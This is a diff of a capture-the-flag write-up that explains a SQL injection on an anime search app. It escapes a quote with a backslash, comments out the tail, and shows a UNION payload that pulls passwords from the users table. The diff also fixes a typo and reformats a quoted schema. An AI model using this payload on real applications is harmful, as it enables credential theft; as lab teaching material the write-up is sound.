@@ -21,34 +21,49 @@ With further assessment into app.py to take a look of how everything functions, 
 
 But we can see that `keyword` was read twice. So if we can somehow disable the second single-quote from the first keyword, the second `keyword` would execute our SQL injection 
 
-And the answer is the escape character `\\` - backdash, to escape the single-quote and make SQL read it as a part of the string. Here's what the SQL command will look like
+And the answer is the escape character `\` - backslash, to escape the single-quote and make SQL read it as a part of the string. Here's what the SQL command will look like
 
 ```sql
 SELECT * FROM anime WHERE LOWER(title) REGEXP '\' or LOWER(description) REGEXP '\'
 ```
 
-Now there is an annoying `\\'` at the end, we can get rid of it using `--`, comment. We can do an SQL injection using `union`
+Now there is an annoying `\'` at the end, we can get rid of it using `--`, comment. We can do an SQL injection using `union`
 
 After that, we check what does the database look like in `init.sql`
 
 >CREATE TABLE IF NOT EXISTS users (
+
 >    id INT AUTO_INCREMENT PRIMARY KEY,
+
 >    username VARCHAR(100) UNIQUE NOT NULL,
+
 >    password VARCHAR(100) NOT NULL,
+
 >    role VARCHAR(10) NOT NULL DEFAULT 'user'
+
 >) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
+
 >
+
 >
+
 >CREATE TABLE IF NOT EXISTS anime (
+
 >    id INT AUTO_INCREMENT PRIMARY KEY,
+
 >    title TEXT NOT NULL,
+
 >    image_url TEXT NOT NULL,
+
 >    genres TEXT NOT NULL,
+
 >    description TEXT NOT NULL
+
 >) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
 
 We then see the users and the anime table. Because the first part of the SQL command reads all `5` attributes in the anime table, 
 >SELECT * FROM anime
+
 we have to add `null` attribute in our payload until it has `5` of it. Although it only print the `title` as the second attribute, we can put our desired output in the second attribute. Here's the crafted payload:
 ```text
  union select null,password,null,null,null from users-- \
